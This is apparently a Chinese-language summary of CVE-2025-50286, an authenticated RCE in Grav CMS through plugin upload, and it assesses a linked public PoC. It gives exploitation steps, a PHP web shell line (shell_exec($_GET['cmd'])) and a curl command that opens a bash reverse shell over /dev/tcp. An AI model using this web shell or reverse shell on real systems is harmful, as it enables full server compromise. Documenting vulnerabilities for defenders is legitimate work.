## CVE-2025-50286 - Grav CMS Authenticated RCE

**漏洞编号:** CVE-2025-50286

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grav CMS

**危害等级:** 高危，可完全控制服务器

**影响版本:** v1.7.48 / Admin Plugin v1.10.48

**利用条件:** 需要管理员权限

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

该漏洞存在于Grav CMS v1.7.48和Admin Plugin v1.10.48中，允许经过身份验证的管理员通过"Direct Install"插件上传功能执行任意PHP代码。 

**有效性:**
提供的POC代码有效。它通过上传包含恶意PHP代码的插件ZIP包，并利用`shell_exec`函数执行通过GET参数传递的命令，从而实现远程代码执行。`evilplugin.php` 文件中的 `shell_exec($_GET['cmd'])` 就是后门所在。

**投毒风险:**
考虑到以下几点，投毒风险较低：
*   代码库主要包含漏洞的利用方法和PoC，目标明确。
*   LICENSE文件声明了版权信息。
*   README文件详细描述了漏洞信息和利用方法，方便使用者理解。
*   PoC代码结构清晰，功能单一，易于审计。
*   虽然漏洞本身可能被滥用，但代码库内容本身没有明显的恶意行为。

尽管如此，考虑到网络安全领域的复杂性，以及开发者可能在代码中植入不易察觉的后门，仍然不能完全排除投毒的可能性。因此，保守起见，将投毒风险评估为5%。

**利用方式:**
1.  攻击者需要获得Grav CMS后台管理员权限。
2.  准备一个包含恶意PHP代码的插件ZIP文件。该ZIP文件需要包含一个PHP文件（例如`evilplugin.php`），该文件包含执行系统命令的代码（例如`shell_exec($_GET['cmd'])`）。同时，需要包含一个最小化的`blueprints.yaml`文件以通过插件安装验证。
3.  登录到Grav CMS后台管理界面，导航到 `Tools > Direct Install`。
4.  上传准备好的恶意插件ZIP文件。
5.  通过构造包含`cmd`参数的HTTP请求，触发插件中的恶意代码，从而执行任意系统命令。例如：`curl --get --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/host.docker.internal/4444 0>&1'" http://<target>/`。

**项目地址:** [binneko/CVE-2025-50286](https://github.com/binneko/CVE-2025-50286)

**漏洞详情:** [CVE-2025-50286](https://nvd.nist.gov/vuln/detail/CVE-2025-50286)